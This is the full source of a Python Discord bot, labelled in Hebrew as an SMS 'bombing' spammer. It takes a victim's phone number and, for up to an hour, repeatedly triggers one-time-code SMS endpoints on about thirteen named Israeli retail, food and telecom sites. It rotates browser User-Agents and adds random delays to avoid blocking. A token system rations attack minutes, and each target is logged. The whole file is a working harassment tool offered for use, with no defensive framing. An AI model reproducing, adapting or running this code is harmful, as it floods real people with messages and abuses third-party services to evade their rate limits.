import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
import random
from datetime import datetime, timedelta
from motor.motor_asyncio import AsyncIOMotorClient

# --- הגדרות מערכת (Environment Variables) ---
TOKEN = os.getenv('DISCORD_TOKEN')
MONGO_URI = os.getenv('MONGO_URI')
BLOCKED_NUMBERS = ["0535524017"]

# --- חיבור ל-Database ---
cluster = AsyncIOMotorClient(MONGO_URI)
db = cluster["cyberil"]
users_col = db["users"]
logs_col = db["logs"]

active_attacks = {}

# רשימת User-Agents מגוונת לעקיפת חסימות
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36"
]

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"✅ CyberIL System Online | Connected to Mongo | Stealth Mode Active")

bot = CyberBot()

# --- פונקציות עזר DB ---
async def get_user(uid):
    user = await users_col.find_one({"_id": uid})
    if not user:
        user = {"_id": uid, "tokens": 0, "last_claim": None}
        await users_col.insert_one(user)
    return user

# --- מנוע הזרקת הבקשות (Stealth Engine) ---
def api_call(url, data=None, method="POST", is_json=True, params=None):
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Referer": url
        }
        
        if method == "GET": 
            r = requests.get(url, headers=headers, params=params, timeout=7)
        elif method == "PUT": 
            r = requests.put(url, json=data, headers=headers, timeout=7)
        else:
            if is_json: r = requests.post(url, json=data, headers=headers, timeout=7)
            else: r = requests.post(url, data=data, headers=headers, timeout=7)
        
        return r.status_code in [200, 201, 204]
    except: return False

async def fire_round(phone):
    magento_data = {"type": "login", "telephone": phone, "bot_validation": 1}
    
    # רשימת ה-APIs המלאה
    api_list = [
        ("https://www.crazyline.com/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.onot.co.il/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.urbanica-wh.com/customer/ajax/post/", magento_data, "POST", False),
        ("https://api.dominos.co.il/sendOtp", {"otpMethod":"text","customerId": phone,"language":"he"}, "POST", True),
        ("https://www.10bis.co.il/NextApi/GetActivationTokenAndSendActivationCodeToUser", None, "GET", True, {"culture":"he-IL", "cellPhone": phone, "email": f"asaf{random.randint(10,99)}@gmail.com"}),
        ("https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "OtpOrigin": "main OTP"}, "PUT", True),
        ("https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}, "POST", True),
        ("https://www.timberland.co.il/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.fixfixfixfix.co.il/customer/ajax/post/", magento_data, "POST", False),
        ("https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, "POST", False),
        ("https://www.globes.co.il/news/login-2022/ajax_handler.ashx", {"value": phone, "value_type": "154"}, "POST", False),
        ("https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}, "POST", True),
        (f"https://www.ivory.co.il/user/login/sendCodeSms/temp{random.randint(1,99)}@gmail.com/{phone}", None, "GET", True)
    ]

    s, f = 0, 0
    for url, data, method, is_json, *params in api_list:
        p = params[0] if params else None
        res = await asyncio.to_thread(api_call, url, data, method, is_json, p)
        if res: s += 1
        else: f += 1
        # דיליי קטן בין אתר לאתר למניעת חסימת IP בשרת
        await asyncio.sleep(random.uniform(0.3, 0.9))
    return s, f

async def run_attack(interaction, phone, minutes):
    uid = interaction.user.id
    active_attacks[uid] = True
    total_s = 0
    end_time = datetime.now() + timedelta(minutes=minutes)
    
    await interaction.followup.send(f"🚀 **ההפצצה על `{phone}` יצאה לדרך!**", ephemeral=True)

    while datetime.now() < end_time and active_attacks.get(uid):
        user = await get_user(uid)
        if user["tokens"] <= 0: break
        
        s, f = await fire_round(phone)
        total_s += s
        
        await users_col.update_one({"_id": uid}, {"$inc": {"tokens": -1}})
        await asyncio.sleep(60) # הפחתת טוקן כל דקה

    await logs_col.insert_one({"user": interaction.user.name, "target": phone, "success": total_s, "date": datetime.now()})
    active_attacks.pop(uid, None)
    await interaction.followup.send(f"🏁 **ההפצצה הסתיימה!** יעד: `{phone}` | הצלחות: `{total_s}`", ephemeral=True)

# --- ממשק כפתורים ---
class CyberView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="שגר הפצצה", style=discord.ButtonStyle.danger, emoji="🚀")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        if user["tokens"] < 1: return await interaction.response.send_message("❌ אין לך דקות!", ephemeral=True)
        
        class LaunchModal(discord.ui.Modal, title="CyberIL - Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10, placeholder="05XXXXXXXX")
            mins = discord.ui.TextInput(label="זמן בדקות (1-60)", default="5")
            async def on_submit(self, modal_inter: discord.Interaction):
                if self.phone.value in BLOCKED_NUMBERS: return await modal_inter.response.send_message("🚫 המספר הזה חסום במערכת!", ephemeral=True)
                await modal_inter.response.defer(ephemeral=True)
                asyncio.create_task(run_attack(modal_inter, self.phone.value, int(self.mins.value)))
        await interaction.response.send_modal(LaunchModal())

    @discord.ui.button(label="יתרה", style=discord.ButtonStyle.primary, emoji="💰")
    async def check(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        await interaction.response.send_message(f"💰 יתרה נוכחית: **{user['tokens']}** דקות.", ephemeral=True)

    @discord.ui.button(label="מתנה יומית", style=discord.ButtonStyle.success, emoji="🎁")
    async def gift(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        now = datetime.now()
        if not user["last_claim"] or now >= user["last_claim"] + timedelta(hours=24):
            await users_col.update_one({"_id": interaction.user.id}, {"$inc": {"tokens": 5}, "$set": {"last_claim": now}})
            await interaction.response.send_message("✅ קיבלת 5 דקות מתנה! תבוא מחר שוב.", ephemeral=True)
        else: await interaction.response.send_message("⏳ כבר לקחת היום, תחזור עוד 24 שעות.", ephemeral=True)

    @discord.ui.button(label="עצור הכל", style=discord.ButtonStyle.secondary, emoji="🛑")
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("🛑 הפקודה לעצור התקבלה.", ephemeral=True)

# --- פקודות סלאש ---
@bot.tree.command(name="setup", description="הפעלת לוח הבקרה של הספאמר")
async def setup(interaction: discord.Interaction):
    user = await get_user(interaction.user.id)
    embed = discord.Embed(title="⚡ CyberIL SMS Control Panel", description="ברוך הבא למערכת ההפצצה. בחר פעולה מהכפתורים למטה.", color=0x00ff00)
    embed.add_field(name="👤 משתמש", value=interaction.user.mention, inline=True)
    embed.add_field(name="💰 יתרה", value=f"{user['tokens']} דקות", inline=True)
    embed.set_footer(text="CyberIL Studio - High Performance Spamer")
    await interaction.response.send_message(embed=embed, view=CyberView())

@bot.tree.command(name="give", description="הענקת דקות למשתמש (אדמין בלבד)")
async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
    # כאן כדאי להוסיף בדיקה אם זה ה-ID שלך בלבד
    await users_col.update_one({"_id": user.id}, {"$inc": {"tokens": amount}}, upsert=True)
    await interaction.response.send_message(f"🎁 הוענקו {amount} דקות ל-{user.mention}!", ephemeral=True)

bot.run(TOKEN)
